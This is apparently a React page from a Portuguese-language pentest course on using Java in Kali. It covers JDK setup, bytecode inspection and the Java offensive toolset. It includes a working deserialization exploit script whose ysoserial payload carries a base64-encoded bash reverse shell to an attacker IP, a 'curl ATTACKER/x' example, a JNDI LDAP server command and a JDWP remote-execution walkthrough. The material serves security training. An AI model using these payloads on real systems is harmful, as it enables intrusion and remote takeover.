import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Java() {
  return (
    <PageContainer
      title="Java no Kali — JDK, JAR e arsenal ofensivo"
      subtitle="Boa parte do tooling sério (Burp, ysoserial, Cobalt Strike, JD-GUI) é Java. Sem JDK funcionando, metade do laboratório não roda."
      difficulty="intermediario"
      timeToRead="16 min"
    >
      <h2>Por que Java importa no pentest</h2>
      <p>
        Você não vai escrever Java do zero todo dia, mas vai <strong>rodar</strong> Java o tempo
        todo: <code>burpsuite_pro.jar</code>, <code>ysoserial.jar</code>,{" "}
        <code>jd-gui.jar</code>, agentes Cobalt Strike, BloodHound legacy (a UI antiga era
        JavaFX), exploits CTF de deserialização. Ter o JDK certo no PATH evita 80% das dores de
        cabeça.
      </p>

      <AlertBox type="info" title="JRE vs JDK — escolha JDK sempre">
        <p>
          <strong>JRE</strong> só roda <code>.class</code>/<code>.jar</code>. <strong>JDK</strong>{" "}
          inclui o JRE + <code>javac</code> (compilador) + <code>jar</code> + <code>jmap</code> +{" "}
          <code>jdb</code>. Para pentest você precisa compilar gadgets, repackagar JARs e debugar
          — então sempre instale o JDK completo.
        </p>
      </AlertBox>

      <h2>Instalando o JDK no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "checa o que já tem (Kali geralmente vem com OpenJDK 21)",
            cmd: "java -version 2>&1 && javac -version 2>&1",
            out: `openjdk version "21.0.5" 2024-10-15
OpenJDK Runtime Environment (build 21.0.5+11-Debian-1)
OpenJDK 64-Bit Server VM (build 21.0.5+11-Debian-1, mixed mode, sharing)
javac 21.0.5`,
            outType: "info",
          },
          {
            comment: "instala default-jdk + variantes específicas (LTS 17 e 21)",
            cmd: "sudo apt update && sudo apt install -y default-jdk openjdk-17-jdk openjdk-21-jdk",
            out: `Setting up openjdk-17-jdk-headless:amd64 (17.0.13+11-1) ...
Setting up openjdk-21-jdk-headless:amd64 (21.0.5+11-1) ...
update-alternatives: using /usr/lib/jvm/java-21-openjdk-amd64/bin/java to provide /usr/bin/java`,
            outType: "success",
          },
          {
            comment: "alterna entre versões instaladas",
            cmd: "sudo update-alternatives --config java",
            out: `There are 2 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                            Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-21-openjdk-amd64/bin/java      2111      auto mode
  1            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      manual mode
  2            /usr/lib/jvm/java-21-openjdk-amd64/bin/java      2111      manual mode

Press <enter> to keep the current choice[*], or type selection number:`,
            outType: "warning",
          },
          {
            cmd: "echo $JAVA_HOME",
            out: "(vazio — defina manualmente)",
            outType: "muted",
          },
          {
            cmd: 'echo "export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64" >> ~/.zshrc && source ~/.zshrc',
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>Comandos do JDK que você vai usar</h2>
      <CommandTable
        title="Toolbelt mínimo"
        variations={[
          {
            cmd: "java -jar tool.jar",
            desc: "Executa um JAR executável (com Main-Class no manifest).",
            output: "Modo padrão para Burp, ysoserial, jd-gui, dirsearch-java, etc.",
          },
          {
            cmd: "java -cp lib1.jar:lib2.jar MainClass",
            desc: "Roda classpath manual (sem manifest).",
            output: "Útil quando o JAR não tem Main-Class definido.",
          },
          {
            cmd: "javac Exploit.java",
            desc: "Compila um .java em .class.",
            output: "Gera Exploit.class no mesmo diretório.",
          },
          {
            cmd: "jar cfm app.jar manifest.txt Main.class lib/",
            desc: "Empacota classes em JAR com manifest custom.",
            output: "Use para repackagar ysoserial com gadgets novos.",
          },
          {
            cmd: "jar tf payload.jar | head",
            desc: "Lista o conteúdo do JAR (como tar tf).",
            output: "Inspeção rápida antes de extrair.",
          },
          {
            cmd: "jar xf payload.jar",
            desc: "Extrai o JAR no diretório atual.",
            output: "Vira árvore de .class — depois decompile com jd-gui.",
          },
          {
            cmd: "javap -c -p Class.class",
            desc: "Disassembler de bytecode (-c = código, -p = privados).",
            output: "Análise rápida sem decompilador.",
          },
          {
            cmd: "java -agentlib:jdwp=transport=dt_socket,server=y,address=*:5005 -jar tool.jar",
            desc: "Sobe debug remoto (JDWP) — atacável!",
            output: "Listening for transport dt_socket at address: 5005",
          },
        ]}
      />

      <h2>Verificando bytecode e classes</h2>
      <Terminal
        path="~/loot"
        lines={[
          {
            comment: "JAR que veio do alvo: ver se está obfuscado e qual versão",
            cmd: "file backend.jar && unzip -l backend.jar | head -8",
            out: `backend.jar: Java archive data (JAR)
Archive:  backend.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
       54  2024-09-12 10:14   META-INF/MANIFEST.MF
     1812  2024-09-12 10:14   com/empresa/api/AuthController.class
     6420  2024-09-12 10:14   com/empresa/api/Crypto.class`,
            outType: "info",
          },
          {
            cmd: "unzip -p backend.jar META-INF/MANIFEST.MF",
            out: `Manifest-Version: 1.0
Main-Class: com.empresa.api.Main
Build-Jdk-Spec: 17
Implementation-Version: 2.4.1`,
            outType: "default",
          },
          {
            comment: "extrai e disassembla a classe interessante",
            cmd: "unzip backend.jar 'com/empresa/api/Crypto.class' && javap -c -p com/empresa/api/Crypto.class | head -20",
            out: `public class com.empresa.api.Crypto {
  private static final java.lang.String SECRET;

  static {};
    Code:
       0: ldc           #2  // String S3cr3t!Hardcoded2024
       2: putstatic     #4  // Field SECRET:Ljava/lang/String;
       5: return`,
            outType: "warning",
          },
        ]}
      />

      <h2>Arsenal Java do pentester</h2>
      <CommandTable
        title="Tools que você vai rodar com java -jar"
        variations={[
          {
            cmd: "burpsuite_community.jar",
            desc: "Burp Suite (Community/Pro). O proxy web mais usado do planeta.",
            output: "java -Xmx4g -jar burpsuite_pro.jar  (use 4-8GB de heap)",
          },
          {
            cmd: "ysoserial.jar",
            desc: "Gera payloads de deserialização Java (CommonsCollections, Spring, Hibernate, etc.).",
            output: "java -jar ysoserial.jar CommonsCollections5 'curl ATTACKER/x' > payload.bin",
          },
          {
            cmd: "ysoserial-modified.jar (ysoserial-plus)",
            desc: "Fork com gadgets recentes (CVE-2023-22515, etc.).",
            output: "Use quando o original falha em libs novas.",
          },
          {
            cmd: "marshalsec.jar",
            desc: "Versão estendida do ysoserial (JNDI, Hessian, Kryo, JSON).",
            output: "java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://x/#Exp 1389",
          },
          {
            cmd: "jd-gui.jar",
            desc: "Decompilador GUI clássico para .jar/.class.",
            output: "Aponta o JAR e lê o código Java reconstruído.",
          },
          {
            cmd: "cfr.jar",
            desc: "Decompilador CLI moderno (mais agressivo que JD).",
            output: "java -jar cfr.jar backend.jar --outputdir src/",
          },
          {
            cmd: "ghidra (suite)",
            desc: "Ghidra é Java/Swing — precisa de JDK 17+ no PATH.",
            output: "$ ./ghidraRun  (lê JAVA_HOME)",
          },
          {
            cmd: "JDownloader / GUI tools",
            desc: "Várias suítes ofensivas (BurpBounty, Logger++) são extensões Java.",
            output: "Carregue via Burp → Extensions → Add → Java.",
          },
        ]}
      />

      <h2>Ysoserial: o caso clássico de deserialização</h2>
      <p>
        Quando o backend Java aceita objetos serializados sem validação (JSF ViewState, RMI, JMX,
        cookies <code>rO0AB</code>...), <strong>ysoserial</strong> gera o payload binário que vira
        RCE assim que o servidor chama <code>readObject()</code>.
      </p>

      <CodeBlock
        language="bash"
        title="exploit-deserialize.sh"
        code={`#!/usr/bin/env bash
# Gera payload e dispara contra endpoint vulnerável.
TARGET="https://alvo.tld/api/state"
LISTENER="10.10.14.12"
LPORT="9001"

# 1. Sobe listener (em outra aba)
# nc -lvnp $LPORT

# 2. Gera payload CommonsCollections5 com bash reverse shell
PAYLOAD_CMD="bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}"

java -jar ysoserial-all.jar CommonsCollections5 "$PAYLOAD_CMD" > payload.bin

# 3. Verifica magic bytes (ac ed 00 05 = stream serializado Java)
xxd payload.bin | head -1

# 4. Envia como Content-Type binário
curl -X POST "$TARGET" \\
  -H "Content-Type: application/x-java-serialized-object" \\
  --data-binary @payload.bin -k -i

echo "[+] Cheque o listener em $LISTENER:$LPORT"`}
      />

      <Terminal
        path="~/exploits/deser"
        lines={[
          {
            cmd: "java -jar ysoserial-all.jar | head -15",
            out: `Y SO SERIAL?
Usage: java -jar ysoserial-all.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                   Dependencies
     -------             -------                   ------------
     AspectJWeaver       @Jang                     aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711
     C3P0                @mbechler                 c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                click-nodeps:2.3.0
     Clojure             @JackOfMostTrades         clojure:1.8.0
     CommonsBeanutils1   @frohoff                  commons-beanutils:1.9.2, commons-collections:3.1
     CommonsCollections1 @frohoff                  commons-collections:3.1
     CommonsCollections2 @frohoff                  commons-collections4:4.0
     CommonsCollections5 @frohoff                  commons-collections:3.1
     CommonsCollections6 @frohoff                  commons-collections:3.1
     Hibernate1          @mbechler`,
            outType: "info",
          },
          {
            cmd: "java -jar ysoserial-all.jar CommonsCollections5 'id' > /tmp/p.bin && xxd /tmp/p.bin | head -2",
            out: `00000000: aced 0005 7372 0011 6a61 7661 2e75 7469  ....sr..java.uti
00000010: 6c2e 4861 7368 5365 7402 0000 0000 0001  l.HashSet.......`,
            outType: "success",
          },
          {
            comment: "padrão aced 0005 = stream Java serializado. base64 vira rO0AB",
            cmd: "base64 -w0 /tmp/p.bin | head -c 60 && echo",
            out: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldHsErsXJWeKsAwAAeHB3DAAAAA",
            outType: "warning",
          },
        ]}
      />

      <h2>Burp Suite: heap, extensões e proxy</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Burp pesa — sempre suba com -Xmx alto",
            cmd: "java -Xmx4g -jar /opt/burpsuite_pro_v2024.10.jar &",
            out: "(janela do Burp abre — usa ~3GB com Logger++ e Turbo Intruder ativos)",
            outType: "muted",
          },
          {
            comment: "extensões Java (.jar) vão em Extensions → Add",
            cmd: "ls ~/burp-extensions/",
            out: `JWT-Editor-2.4.jar
LoggerPlusPlus.jar
TurboIntruder-1.34.jar
HackvertorBurpPlugin-1.8.0.jar`,
            outType: "info",
          },
          {
            comment: "Burp aceita extensões Python via Jython — baixe jython-standalone.jar",
            cmd: "ls ~/.BurpSuite/jython-standalone-2.7.3.jar",
            out: "/home/wallyson/.BurpSuite/jython-standalone-2.7.3.jar",
            outType: "default",
          },
        ]}
      />

      <h2>JDWP: debug remoto vira RCE</h2>
      <p>
        Aplicações Java em produção às vezes ficam com a porta JDWP (5005, 8000, 8787) aberta.
        Quem se conecta executa código arbitrário no contexto da JVM. Use{" "}
        <code>jdwp-shellifier.py</code> ou Metasploit.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "nmap -sV -p 5005,8000,8787,9001 alvo.tld",
            out: `PORT     STATE SERVICE         VERSION
5005/tcp open  java-debug-wire Java Debug Wire Protocol`,
            outType: "warning",
          },
          {
            cmd: "git clone https://github.com/IOActive/jdwp-shellifier && cd jdwp-shellifier",
            out: "Cloning into 'jdwp-shellifier'...",
            outType: "muted",
          },
          {
            cmd: "python2 jdwp-shellifier.py -t alvo.tld -p 5005 --cmd 'id > /tmp/pwn'",
            out: `[+] Targeting 'alvo.tld:5005'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 21.0.5+11'
[+] Found Runtime class: id=8b0
[+] Found Runtime.getRuntime(): id=8b1
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x1
[+] Selected payload 'id > /tmp/pwn'
[+] Command successfully executed`,
            outType: "success",
          },
        ]}
      />

      <PracticeBox
        title="Compile, empacote e dispare seu primeiro JAR ofensivo"
        goal="Escrever um stub Java que executa um comando, empacotar como JAR e rodar — fluxo idêntico ao usado em CTFs e gadgets custom."
        steps={[
          "Crie Pwn.java com Runtime.getRuntime().exec(args[0]).",
          "Compile com javac.",
          "Crie um manifest com Main-Class.",
          "Empacote com jar cfm.",
          "Execute com java -jar e teste com 'id'.",
        ]}
        command={`mkdir -p ~/lab/java-pwn && cd ~/lab/java-pwn

cat > Pwn.java <<'EOF'
public class Pwn {
  public static void main(String[] args) throws Exception {
    Process p = Runtime.getRuntime().exec(args[0]);
    p.getInputStream().transferTo(System.out);
  }
}
EOF

javac Pwn.java
echo "Main-Class: Pwn" > manifest.txt
jar cfm pwn.jar manifest.txt Pwn.class

java -jar pwn.jar id`}
        expected={`uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`}
        verify="Se o id rodou via JAR, você acabou de provar o ciclo completo: source → bytecode → JAR executável. Esse mesmo fluxo gera gadgets custom para ysoserial e payloads de Cobalt."
      />

      <AlertBox type="warning" title="Versões importam">
        Muito gadget de deserialização clássico precisa de JDK 8/11 — em 17+ várias APIs viraram
        restritas. Tenha pelo menos 8, 11, 17 e 21 instalados via{" "}
        <code>update-alternatives</code> e troque com <code>JAVA_HOME=...</code> antes do{" "}
        <code>java -jar</code>.
      </AlertBox>

      <AlertBox type="danger" title="Cuidado com -Xmx em VM pequena">
        <code>java -Xmx8g -jar burpsuite_pro.jar</code> em VM de 4GB faz o OOM killer matar tudo
        em segundos — incluindo seu reverse shell. Ajuste para <code>-Xmx2g</code> em labs e
        deixe Burp em uma VM dedicada quando possível.
      </AlertBox>
    </PageContainer>
  );
}
